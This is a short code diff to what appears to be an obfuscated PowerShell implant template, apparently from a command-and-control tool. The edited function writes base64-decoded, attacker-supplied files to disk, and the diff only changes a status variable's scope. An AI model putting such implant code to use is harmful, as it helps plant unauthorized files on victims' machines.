@@ -18,9 +18,9 @@ function {{ ron.obf_upload_file }} ($b) {
         $fn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c[0].ToString()))
         $fc = [System.Convert]::FromBase64String($c[2].ToString())
         $fc | Set-Content "$fn" -encoding Byte -NoNewLine
-        $script:tr = 1
+        $global:tr = 1
     } catch { 
-        $script:tr = 0 
+        $global:tr = 0 
     } 
 }'''
         return var
